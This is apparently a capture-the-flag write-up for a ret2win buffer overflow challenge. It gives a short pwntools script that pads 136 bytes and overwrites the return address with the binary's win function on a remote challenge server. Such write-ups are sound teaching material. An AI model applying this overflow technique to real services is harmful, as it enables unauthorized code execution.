## Writeup

I start by decompiling the binary in Ghidra and can see the main function with 128 bytes buffer:

There's also a win function that reads the flag:

This is a standard ret2win type challenge which I solved with this script:  

```python
from pwn import *

# Define the target binary
binary = './echo'
elf = ELF(binary)

prog = remote('challenge.ctf.games', 31084)

# Argument to pass to the binary
payload = b'A' * 136
payload += p64(elf.symbols['win'])  # Overwrite the return address with the win function address

prog.recvline()
prog.sendline(payload)
prog.interactive()
```
